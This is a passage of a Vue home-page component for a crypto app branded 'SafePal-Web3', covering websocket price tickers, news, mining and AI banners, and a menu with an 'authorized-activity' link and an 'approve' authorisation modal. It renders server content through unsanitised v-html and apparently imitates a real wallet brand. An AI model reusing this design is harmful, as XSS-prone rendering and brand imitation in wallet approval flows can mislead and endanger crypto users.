<template>
    <div>
        <div class="top-container">
            <div class="home-top">
                <img class="menu-icon" @click="chageShowMenu(true)"
                    src="../assets/static/image/icon_menus.d24882c7.svg">
                <img class="top-img" src="../assets/static/image/img_home_top.099d659e.png">
                <div class="top-title">SafePal-Web3</div>
                <div class="top-subtitle">{{ $t('key151') }}</div>
            </div>
        </div>
        <div class="market-container">
            <div class="trade-wrapper">
                <div class="trade-title">{{ $t('key152') }}</div>
                <div class="process">
                    <div class="process-item" :class="[tabindex === 0 ? 'active' : '']" @click="changeTabIndex(0)">
                        <div class="icon-wrapper" style="font-weight: 600;">
                            <!---->
                            <span>{{ $t('key153') }}</span>
                        </div>
                    </div>
                    <!-- <div class="process-item" :class="[tabindex === 1 ? 'active' : '']" @click="changeTabIndex(1)">
                        <div class="icon-wrapper">
                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                                aria-hidden="true" role="img" class="iconify iconify--fluent" width="1em" height="1em"
                                preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"
                                data-icon="fluent:star-24-filled">
                                <g fill="none">
                                    <path
                                        d="M10.788 3.103c.495-1.004 1.926-1.004 2.421 0l2.358 4.777l5.273.766c1.107.161 1.549 1.522.748 2.303l-3.816 3.72l.901 5.25c.19 1.103-.968 1.944-1.959 1.424l-4.716-2.48l-4.715 2.48c-.99.52-2.148-.32-1.96-1.424l.901-5.25l-3.815-3.72c-.801-.78-.359-2.142.748-2.303L8.43 7.88l2.358-4.777z"
                                        fill="currentColor"></path>
                                </g>
                            </svg>
                            <span style="margin-left: 3px;line-height: 1;" v-if="tabindex === 1">{{
                                $t('key154') }}</span>
                        </div>
                    </div> -->
                    <!-- <div class="process-item" :class="[tabindex === 2 ? 'active' : '']" @click="changeTabIndex(2)">
                        <div class="icon-wrapper">
                            <span style="line-height: 1;">{{ $t('key155') }}</span>
                        </div>
                    </div> -->
                </div>
                <div class="market-list">
                    <div class="rank-header" @click="go('/business', { contract_id: item.contract_id })"
                        v-for="(item, index) in biList" :key="index" :class="[item.bool ? '' : 'ynone']">
                        <div class="rank-name d-flex">
                            <img :src="item.icon">
                            <div>
                                <span class="name">{{ item.coin }}</span>
                                <span class="name"
                                    style="font-weight: 500; color: rgb(95, 103, 117); font-family: NunitoSemibold;">usdt</span>
                            </div>
                        </div>
                        <div class="rank-latest">
                            <homekline v-if="item.kData" :kData="item.kData" :change="item.change"></homekline>
                        </div>
                        <div class="rank-change">
                            <div class="price">$ {{ item.close }}</div>
                            <div class="change">
                                <span class="rise" v-if="Number(item.change) >= 0">+{{ item.change
                                }}%</span>
                                <span class="fall" v-if="Number(item.change) < 0">{{ item.change
                                }}%</span>
                                <span>24 Hrs</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!---->
        </div>
        <div class="banner-container">
            <div class="home-banner-container">
                <div class="banner-content" @click="go('/ai')">
                    <div class="banner-title">{{ $t('key179') }}{{ $t('key178') }}</div>
                    <div class="banner-subtitle">{{ $t('key157') }}Api</div>
                    <div class="banner-img">
                        <img src="../assets/static/image/img_banner.dbd07ead.png" alt="">
                    </div>
                </div>
                <div class="banner-content" @click="go('/mining')">
                    <div class="banner-title">{{ $t('key112') }}</div>
                    <div class="banner-subtitle">{{ $t('key122') }}</div>
                    <div class="banner-img">
                        <img src="../assets/static/image/img_banner_1.330f874d.png" alt="">
                    </div>
                </div>
            </div>
        </div>
        <!-- <div class="invite-container" >
            <div class="home-invite"  @click="go('/share')">
                <div class="invite-title" >{{ $t('key159') }}</div>
                <div class="invite-content" >
                    <div class="fs-32" >{{ $t('key159') }}{{ $t('key164') }}</div>
                    <div class="fs-44" >{{ $t('key161') }}</div>
                    <div class="invite-img" >
                        <img src="../assets/static/image/icon_arrow.3a19d906.svg" class="img-arrow" >
                        <img src="../assets/static/image/img_invite.edacfcdd.png" class="img-invite" >
                    </div>
                </div>
            </div>
        </div> -->
        <div class="news-container">
            <div class="home-news">
                <div class="news-title">
                    <div class="fs-30" style="font-weight: 600;">{{ $t('key0') }}</div>
                    <div class="more" @click="go('/news-list')">{{ $t('key162') }}</div>
                </div>
                <div class="news-content">
                    <div class="news-item" style="width: 100%;display: flex;flex-direction: column;"
                        v-for="(item, index) in newsList" :key="index">
                        <!-- @click="changenewsPanelModal(true, item.link)"> -->
                        <div class="news-info" style="width: 100%;">
                            <div class="main-title"
                                style="display: flex;flex-direction: column;justify-content: space-evenly;height: 1.7rem;">
                                <span class="fs-26" style="font-size: .28rem;font-weight: 600;color:#000"> {{ item.title
                                    }}
                                </span>
                                <span class="fs-26" style="color:darkgrey">{{ item.news_time }}</span>
                            </div>
                            <div ref='showText' v-html="item.abstract" class="subtitle show" style="font-size: .28rem;">
                            </div>
                            <!-- <div v-else class="subtitle show"  style="font-size: .28rem;">{{ item.abstract }}</div> -->
                        </div>
                        <div class="author" ref="textshow" style="text-align: center;width: 100%;color:steelblue"
                            @click="showNews(index)">
                            {{ $t('key271') }}
                        </div>
                        <div class="emotion" style="display: flex;align-items: center;gap: .2rem; font-size: .23rem;">
                            <div style="display: flex;align-items: center;gap: .1rem;" class="emotion-item">
                                <span>Positive({{ item.up_info }})</span><img style="width: .2rem;height: .2rem;"
                                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAGaBAMAAABHwGMuAAAAHlBMVEUAAAAUspgUspgUspgUspgUspgUspgUspgUspgUspg1sh+QAAAACXRSTlMAQMBgoDDw0BA3VwgBAAAEXklEQVR42szQuQ3CUABAsUhMlY4haf62PBBHrhIRewRPv3O5TqL5NoEuY4hd8xhgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1liV1lgV1li1yPL63pmeV1lRet6ZWld7yyr65NldX2zpK5FltS1zHK6VllO1zpL6dpkKV3bLKNrl2V07bOEroMsoeso6/yuw6zzu/6QVReZdWeHjk20isIoiv4IiuVYgiWI4HSgYgmGRsYiaLueXOZtWBcmeif97oXNCi7G+vr86a9ynWP9+fj87dd35DrH+vzqIusncp1jfbjKeotc51iPq6wHcp1jXWch1znWdZZxnWNFlnGdY0UWcZ1jVRZxnWN1lnM5VmYZ1zlWZzmXY3WWczlWZzmXY3UWcp1jdZZzOVZnOZdjdZZzOVZnOZdjdRZynWN1lnM5Vmc5l2N1lnM5Vmc5l2N1FnGdY3WWczlWZzmXY3UWcDkWZBmXY3WWczlWZzmXY3WWczlWZ/3P1XtPWJClXI7VWc7lWJ3lXI7VWc7lWJ3lXI7VWcwFWJCFXI7VWc7lWJ3lXI7VWc7lWJ3lXIAFWcD1BrE6y7n2+fU3xOos53r3eDwZVmc51++9G1djSZZzDWtchNVZF1yN1VzDoqzgCqxxAZZnjauxmmtYlhVchTUuwOKscSVWcw0Ls4IrscYFWJw1rsBqrmFpVnA11rgAi7PGFVjFNSzOIq5hBVdheda4Aiu4hsVZwjWs4AqszgKuYQVXYXUWcA0ruAILspprWMEVWJLVXMMKrsCCrOYaVnI1Vmc1V2ONq7E8q7mGFVyBJVnNNazgCizIaq5hBVdgSVZzDSu4AguymmtYwRVYkBVcgTWuwMKs5hpWcAWWZDXXsK65AkuymmtYwRVYktVcwwquwIKs5hpWcgUWZCXXsJIrsCAruIa1JVdgQVZwDav3dIEFWck1rK25vlxgQVZyDWvLfXq8XNb24+HzrN6ddWfdWXfWs7uz7qw76876x+4cCAAAAAAI8reeYIMiaGlpaWktLS0traWlpaW1tLS0tJaWlpbW0tLS0lpaWlpaS0tLS2tpaWlpLS0tLa2lpaWltbS0tLSWlpaW1tLS0tJaWlpaWktLS0traWlpaS0tLS2tpaWlpbW0tLS0lpaWltbS0tLSWlpaWlpLS0tLa2lpaWktLS0traWlpaW1tLS0tJaWllYbdRZOMOqsUWdhAlZBnECCIoMBCWFo6ZzFVmkAAAAASUVORK5CYII=">
                            </div>
                            <div style="display: flex;align-items: center;gap: .1rem;" class="emotion-item">
                                <span>Negative({{ item.down_info }})</span><img style="width: .2rem;height: .2rem;"
                                    src="data:image/png;base64,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">
                            </div>
                        </div>
                        <!-- <div class="news-img" >
                            <img :src="item.image" class="img-pic" >
                        </div> -->
                    </div>
                </div>
                <div class="news-tips">{{ $t('key163') }}</div>
            </div>
        </div>

        <kefu />

        <van-popup v-model="showMenu" position="left" :style="{ height: '100%' }">
            <div class="is-active mobile-main-sidebar" ref="leftSidebar"
                style="width: auto;min-width: 4.2rem;padding-right: 0.1rem;position: static;">
                <div class="inner">
                    <ul class="icon-side-menu">
                        <div class="drawer-header">
                            <div class="d-flex" style="margin-top: 5px;" @click="chageShowMenu(false)">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                                    aria-hidden="true" role="img" class="iconify iconify--fluent sidebar-svg"
                                    width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"
                                    data-icon="fluent:dismiss-24-regular">
                                    <g fill="none">
                                        <path
                                            d="M4.397 4.554l.073-.084a.75.75 0 0 1 .976-.073l.084.073L12 10.939l6.47-6.47a.75.75 0 1 1 1.06 1.061L13.061 12l6.47 6.47a.75.75 0 0 1 .072.976l-.073.084a.75.75 0 0 1-.976.073l-.084-.073L12 13.061l-6.47 6.47a.75.75 0 0 1-1.06-1.061L10.939 12l-6.47-6.47a.75.75 0 0 1-.072-.976l.073-.084l-.073.084z"
                                            fill="currentColor"></path>
                                    </g>
                                </svg>
                            </div>
                        </div>
                        <div class="drawer-logo">
                            <img class="avatar"
                                src="https://assets.bitdegree.org/crypto/storage/optimized/safepal-logo-small.png?tr=w-200">
                            <!-- 地址信息 -->
                            <!-- <div class="wallet-address" >
                                <div >
                                    <img src="../assets/static/image/avatar.33e95978.png" alt="" class="avatar"
                                        >
                                </div>
                                <div >{{ ellipsisAddress(walletObj.address) }}</div>
                                <div class="copy-btn btn-copy" :data-clipboard-text="walletObj.address" @click="copy"
                                    >
                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                                        aria-hidden="true" role="img" class="iconify iconify--fluent" width="1em"
                                        height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"
                                        data-icon="fluent:copy-24-regular" >
                                        <g fill="none">
                                            <path
                                                d="M5.503 4.627L5.5 6.75v10.504a3.25 3.25 0 0 0 3.25 3.25h8.616a2.251 2.251 0 0 1-2.122 1.5H8.75A4.75 4.75 0 0 1 4 17.254V6.75c0-.98.627-1.815 1.503-2.123zM17.75 2A2.25 2.25 0 0 1 20 4.25v13a2.25 2.25 0 0 1-2.25 2.25h-9a2.25 2.25 0 0 1-2.25-2.25v-13A2.25 2.25 0 0 1 8.75 2h9zm0 1.5h-9a.75.75 0 0 0-.75.75v13c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-13a.75.75 0 0 0-.75-.75z"
                                                fill="currentColor"></path>
                                        </g>
                                    </svg>
                                </div>
                            </div> -->
                        </div>
                        <!---->
                        <div class="join-btn">
                            <!-- <button type="button" aria-hidden="false" class="button button v-button is-fullwidth"
                                v-if="userinfo.status == 0"  @click="showShouquan(false)">
                                <span>
                                    <img src="../assets/static/image/icon_join.btn.44a592cf.svg" >
                                    <span >{{ $t('key164') }}</span>
                                </span>
                            </button> -->
                            <button type="button" aria-hidden="false" class="button button v-button is-fullwidth"
                                @click="go('/authorized-activity')">
                                <span>
                                    <img src="../assets/static/image/icon_join.btn.44a592cf.svg">
                                    <span>{{ $t('key165') }}</span>
                                </span>
                            </button>
                        </div>
                        <div class="menu-item">
                            <div class="item-title">{{ $t('key166') }}</div>
                            <li class="drawer-item" v-if="userinfo.status == 0" @click="go('/wallet')">
                                <img src="../assets/static/image/icon_menu_wallet.e9b0e83b.svg">
                                <span>{{ $t('key70') }}</span>
                            </li>
                            <li class="drawer-item" v-if="userinfo.status == 1" @click="go('/wallet')">
                                <img src="../assets/static/image/icon_menu_wallet.e9b0e83b.svg">
                                <span>{{ $t('key70') }}</span>
                            </li>
                            <li class="drawer-item" @click="go('/wallet-c2c')">
                                <img src="../assets/static/image/icon_menu_ai.e895c6df.svg">
                                <span>{{ $t('key199') }}</span>
                            </li>
                            <li class="drawer-item" @click="go('/ai')">
                                <img src="../assets/static/image/icon_menu_ai.e895c6df.svg">
                                <span>{{ $t('key178') }}</span>
                            </li>
                            <li class="drawer-item" @click="go('/mining')">
                                <img src="../assets/static/image/icon_menu_mining.ebcf82be.svg">
                                <span>{{ $t('key112') }}</span>
                            </li>
                            <li class="drawer-item" @click="go('/miningrecord')">
                                <img src="../assets/static/image/icon_menu_record.d0fd71ac.svg">
                                <span>{{ $t('key73') }}</span>
                            </li>
                            <li class="drawer-item" @click="go('/authentication_home')">
                                <img src="../assets/static/image/icon_menu_mining.ebcf82be.svg">
                                <span>{{ $t('key200') }}</span>
                            </li>
                           
                            <!-- <a :href="configInfo.chatLink" >
                                <li class="drawer-item" >
                                    <img src="../assets/static/image/icon_menu_cs.05117d1f.svg" >
                                    <span >{{$t('key168')}}</span>
                                </li>
                            </a> -->
                            <li class="drawer-item" @click="go('/contact?type=3')">
                                <img src="../assets/static/image/icon_menu_cs.05117d1f.svg">
                                <span>{{ $t('key202') }}</span>
                            </li>
                            <li class="drawer-item" @click="go('/about?type=4')">
                                <img src="../assets/static/image/icon_menu_record.d0fd71ac.svg">
                                <span>{{ $t('key201') }}</span>
                            </li>
                            
                            <li class="drawer-item" @click="go('/help')">
                                <img src="../assets/static/image/icon_menu_qa.7ec34a68.svg">
                                <span>{{ $t('key182') }}</span>
                            </li>
                            <!-- <li class="drawer-item"  @click="go('/share')">
                                <img src="../assets/static/image/icon_menu_share.2e020ec7.svg" >
                                <span >{{ $t('key171') }}</span>
                            </li>
                            <li class="drawer-item"  @click="go('/language')">
                                <img src="../assets/static/image/icon_menu_set.81a4b22b.svg" >
                                <span >{{ $t('key106') }}</span>
                            </li> -->
                        </div>
                    </ul>
                    <ul class="bottom-icon-side-menu"></ul>
                </div>
            </div>
        </van-popup>

        <div v-if="noticeModal" style="z-index: 2004;">
            <div class="notice-popup van-popup van-popup--center" style="z-index: 2077;">
                <div class="notice-container">
                    <div class="notice-title">
                        <span>{{ noticeInfo.title }}</span>
                        <div>
                            <svg @click="changenoticeModal(false)" xmlns="http://www.w3.org/2000/svg"
                                xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img"
                                class="iconify iconify--fluent icon-close" width="1em" height="1em"
                                preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"
                                data-icon="fluent:dismiss-24-regular">
                                <g fill="none">
                                    <path
                                        d="M4.397 4.554l.073-.084a.75.75 0 0 1 .976-.073l.084.073L12 10.939l6.47-6.47a.75.75 0 1 1 1.06 1.061L13.061 12l6.47 6.47a.75.75 0 0 1 .072.976l-.073.084a.75.75 0 0 1-.976.073l-.084-.073L12 13.061l-6.47 6.47a.75.75 0 0 1-1.06-1.061L10.939 12l-6.47-6.47a.75.75 0 0 1-.072-.976l.073-.084l-.073.084z"
                                        fill="currentColor"></path>
                                </g>
                            </svg>
                        </div>
                    </div>
                    <div class="notice-content">
                        <!---->
                        <span>
                            <p v-html="noticeInfo.content"></p>
                        </span>
                    </div>
                    <!---->
                    <!---->
                </div>
            </div>
        </div>

        <approve v-model="shouquanModal" v-if="shouquanModal" :isShowToast="isShowToast"></approve>

        <news-panel v-model="newsPanelModal" :url="link">
        </news-panel>
    </div>
</template>

<script>
import headerNav from '@/components/header-nav.vue'
import kefu from '@/components/kefu.vue'
import homekline from '@/components/homekline.vue'
import newsPanel from '@/components/news-panel.vue'
import approve from '@/components/approve.vue'
import Clipboard from 'clipboard'
import { getContractList, getKlineData, getNewsList, findNotice } from '@/api/user'
import { mapActions } from 'vuex'
import config from '@/config'
import { localSave, localRead } from "@/libs/util"

export default {
    name: 'home',
    props: {
    },
    components: {
        approve,
        headerNav,
        kefu,
        newsPanel,
        homekline
    },
    computed: {
        userinfo() {
            return this.$store.state.user.userinfo
        },
        configInfo() {
            return this.$store.state.user.configInfo
        },
        walletObj() {
            return this.$store.state.user.walletObj
        }
    },
    data() {
        return {
            isShowToast: false,
            // websocket
            ws: {},
            wsUrl: ``,
            heart_jump: false, //websocket 心跳状态
            ws_heart: '', // ws心跳定时器
            //websocket持续连接的定时器
            continuous_link: null,
            noticeModal: false,
            newsPanelModal: false,
            showMenu: false,
            tabindex: 0,
            shouquanModal: false,
            biList: [],
            type: 1,
            currBiList: [],
            newsList: [],
            link: '',
            noticeInfo: {}
        }
    },
    watch: {
        tabindex() {
            this.type = this.tabindex + 1
            this.getContractList2()
        },
        userinfo() {
            if (this.biList.length <= 0) {
                this.getContractList()
            }
        },

    },
    mounted() {
        if (window.location.protocol === 'http:') {
            this.wsUrl = `ws://${config.wssHost}/ws/`

        } else {
            this.wsUrl = `wss://${config.wssHost}/ws/`
        }
        // if (!sessionStorage.getItem("noticeModal")) this.changenoticeModal(true)
        this.getContractList()
        this.getNewsList()
        this.findNotice()
    },
    beforeDestroy() {
        this.close_heart();
        this.ws.close();
    },
    updated() {
        // this.$nextTick(() => {
        //     if (this.$refs.showText.clientHeight < 60) {
        //         this.$refs.textshow.innerText = ''
        //     }
        // })
    },
    methods: {
        showNews(index) {
            this.$refs.textshow[index].innerText = this.newsList[index].show ? this.$t('key271') : this.$t('key272')
            this.$refs.showText[index].className = this.newsList[index].show ? 'subtitle show' : 'subtitle'
            this.newsList[index].show = !this.newsList[index].show;
        },
        ellipsisAddress(str) {
            if (!str) return
            let address = str.slice(0, 4) + '****' + str.substr(-4)
            return address
        },
        findNotice() {
            findNotice({ type: 1 }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.noticeInfo = data.data
                    if (localRead('notice') !== data.data.token) {
                        this.changenoticeModal(false)
                        localSave('notice', data.data.token)
                    }
                }
            })
        },
        getNewsList() {
            getNewsList({
                page: 1,
                page_size: 5
            }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.newsList = data.data.list
                    this.newsList.forEach(element => {
                        element['show'] = false
                    });
                }
            })
        },
        // WebSjocket操作
        creat_socket(url) {
            this.ws = new WebSocket(url);
            this.close_heart();
            this.initWebSocket();
        },
        initWebSocket() {
            let that = this;
            let ws = that.ws;
            // 打开WebSjocket
            ws.onopen = function (e) {
                console.log("WebSjocket已经打开");
                that.heart_jump = true; // 心跳状态打开
                // that.heart();
                let json = JSON.stringify({ "sub": "ticker" })
                let qingli = JSON.stringify({ "unsub": "ticker" })
                that.ws.send(qingli);
                that.ws.send(json);

                // 再次清除防止重复请求
                clearInterval(that.continuous_link);
            };

            // 接收WebSjocket
            // let mouse_over = [];
            ws.onmessage = (event) => {

                if ((!event && !event.data) || event.data == "undefined") {
                    return;
                } else {
                    let data = JSON.parse(event.data)
                    if (data.channel) {
                        // console.log(data)
                        that.biList.forEach((item, index) => {
                            if (item.coin_alias == data.data.symbol) {
                                if (that.biList[index].kData) {
                                    that.biList[index].kData[that.biList[index].kData.length - 1] = {
                                        open: Math.abs(data.data.open),
                                        close: Math.abs(data.data.close),
                                        time: that.biList[index].kData[that.biList[index].kData.length - 1].time,
                                        value: Math.abs(data.data.close)
                                    }
                                    that.changeCurrKdata(that.biList[index].kData, index)
                                }
                            }
                        })
                    }
                    // that.ws.send(json);
                    // console.log(data);
                }
            }
            // 关闭
            ws.onclose = function (e) {
                if (that.heart_jump) {
                    that.close_heart();
                    that.heart_jump = false;

                }
                console.log("WebSocket关闭");
            };

            // WebSocket发生错误
            ws.onerror = function (e) {
                if (that.heart_jump) {
                    that.close_heart();
                    that.heart_jump = false;
                }
                that.reconnect(that.wsUrl);
                console.log("WebSocket发生错误");
            };
        },

        heart(props) {
            let that = this;
            this.ws_heart = setInterval(() => {
                that.ws.send(props);
            }, 10 * 1000);
        },

        close_heart() {
            console.log("ws心跳结束");
            clearInterval(this.ws_heart);
            this.ws_heart = null;
        },

        reconnect(url) {
            if (this.lockReconnect) return;
            this.lockReconnect = true;
            let that = this;
            // 先清除定时器
            clearInterval(this.continuous_link);

            this.continuous_link = setInterval(function () {
                //没连接上会一直重连，设置延迟避免请求过多
                that.lockReconnect = false;
                that.creat_socket(url);
                console.log("重启中...");
            }, 5000);
        },
        checkIsShow(coin_alias) {
            let arr = this.currBiList.filter(item => {
                return item.coin_alias === coin_alias
            })
            return arr.length
        },
        getContractList2(isInit) {
            getContractList({ type: this.type }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    let currBiList = data.data
                    this.currBiList = currBiList
                    this.biList.forEach((item, index) => {
                        if (this.checkIsShow(item.coin_alias)) this.$set(this.biList[index], "bool", true)
                        else this.biList[index].bool = this.$set(this.biList[index], "bool", false)
                    })
                    // if (isInit) this.init()
                }
            })
        },
        getContractList() {
            getContractList({ type: 3 }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.biList = data.data
                    if (data.data.length > 0) {
                        this.getContractList2(true)
                        this.biList.forEach((item, index) => {
                            this.getKlineData(item.contract_id, index)
                        })
                    }
                    // //页面刚进入时开启长连接
                    this.creat_socket(this.wsUrl)
                }
            })
        },
        getKlineData(contract_id, index) {
